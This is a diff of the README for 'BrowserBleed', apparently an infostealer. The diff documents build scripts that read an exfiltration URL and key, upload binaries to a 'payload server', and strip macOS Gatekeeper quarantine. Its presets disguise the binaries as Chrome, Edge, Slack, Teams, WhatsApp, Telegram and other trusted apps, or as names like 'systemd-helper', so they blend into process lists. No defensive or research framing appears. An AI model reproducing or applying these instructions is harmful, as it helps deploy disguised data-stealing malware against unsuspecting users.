@@ -365,23 +365,24 @@ Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a te
 .\build_windows.ps1 -Preset chrome
 .\build_windows.ps1 -Preset slack
 .\build_windows.ps1 -Preset teams
+.\build_windows.ps1 -Preset chrome -Upload   # build and upload to payload server
 ```
 
 Available presets (set exe name, process name, icon, and Properties metadata automatically):
 
 | # | Preset | Exe name | Appears as |
 |---|--------|----------|------------|
-| 1 | `chrome` | `chrome_crashpad_handler.exe` | Google LLC - Google Chrome |
-| 2 | `edge` | `msedge_crashpad_handler.exe` | Microsoft Corporation - Microsoft Edge |
-| 3 | `brave` | `brave_crashpad_handler.exe` | Brave Software, Inc - Brave Browser |
-| 4 | `firefox` | `plugin-container.exe` | Mozilla Corporation - Mozilla Firefox |
-| 5 | `opera` | `opera_crashpad_handler.exe` | Opera Software AS - Opera internet browser |
+| 1 | `chrome` | `chrome.exe` | Google LLC - Google Chrome |
+| 2 | `edge` | `edge.exe` | Microsoft Corporation - Microsoft Edge |
+| 3 | `brave` | `brave.exe` | Brave Software, Inc - Brave Browser |
+| 4 | `firefox` | `firefox.exe` | Mozilla Corporation - Mozilla Firefox |
+| 5 | `opera` | `opera.exe` | Opera Software AS - Opera internet browser |
 | 6 | `slack` | `slack.exe` | Slack Technologies, Inc. - Slack |
-| 7 | `discord` | `Discord.exe` | Discord Inc. - Discord |
+| 7 | `discord` | `discord.exe` | Discord Inc. - Discord |
 | 8 | `teams` | `ms-teams.exe` | Microsoft Corporation - Microsoft Teams |
-| 9 | `zoom` | `Zoom.exe` | Zoom Video Communications, Inc. - Zoom |
-| 10 | `whatsapp` | `WhatsApp.exe` | WhatsApp LLC - WhatsApp |
-| 11 | `telegram` | `Telegram.exe` | Telegram FZ-LLC - Telegram Desktop |
+| 9 | `zoom` | `zoom.exe` | Zoom Video Communications, Inc. - Zoom |
+| 10 | `whatsapp` | `whatsapp.exe` | WhatsApp LLC - WhatsApp |
+| 11 | `telegram` | `telegram.exe` | Telegram FZ-LLC - Telegram Desktop |
 
 Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.
 
@@ -403,14 +404,45 @@ Icons are pulled automatically from the app's install path if it's installed on 
 chmod +x build_mac.sh && ./build_mac.sh
 ```
 
-Same substitution via `sed`, produces `BrowserBleed_mac`. The build script also strips the Gatekeeper quarantine attribute automatically. If you move or re-download the binary:
+Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, patches a temp copy of `BrowserBleed_mac.py`, builds via PyInstaller, and strips the Gatekeeper quarantine attribute automatically. Requires Python 3.10+ (install via Homebrew: `brew install python@3.12`).
+
+**Disguising the binary** — use `--preset` to pick a disguise, or run without arguments for an interactive menu:
+
 ```bash
-xattr -dr com.apple.quarantine BrowserBleed_mac
+./build_mac.sh --preset chrome
+./build_mac.sh --preset firefox
+./build_mac.sh --preset slack
 ```
 
-To override:
+Available presets:
+
+| # | Preset | Binary name | Blends in as |
+|---|--------|-------------|--------------|
+| 1 | `chrome` | `google-chrome` | Google Chrome process |
+| 2 | `edge` | `microsoft-edge` | Microsoft Edge process |
+| 3 | `brave` | `brave-browser` | Brave Browser process |
+| 4 | `firefox` | `firefox` | Mozilla Firefox process |
+| 5 | `opera` | `opera` | Opera process |
+| 6 | `slack` | `slack` | Slack process |
+| 7 | `discord` | `discord` | Discord process |
+| 8 | `teams` | `teams` | Microsoft Teams process |
+| 9 | `zoom` | `zoom` | Zoom process |
+| 10 | `whatsapp` | `whatsapp-desktop` | WhatsApp Desktop process |
+| 11 | `telegram` | `telegram-desktop` | Telegram Desktop process |
+
+Custom binary name:
 ```bash
-EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
+./build_mac.sh --name helper-agent
+```
+
+To point at a different server without `deploy/config`:
+```bash
+EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh --preset chrome
+```
+
+If you move or re-download the binary, re-strip quarantine:
+```bash
+xattr -dr com.apple.quarantine google-chrome
 ```
 
 ### Step 4 - Build for Linux
@@ -450,6 +482,11 @@ Available presets:
 Custom binary name (any string you want in `ps`):
 ```bash
 sudo ./build_linux.sh --name systemd-helper
+```
+
+Build and upload to the payload server in one step:
+```bash
+sudo ./build_linux.sh --preset chrome --upload
 ```
 
 To point at a different server without `deploy/config`:
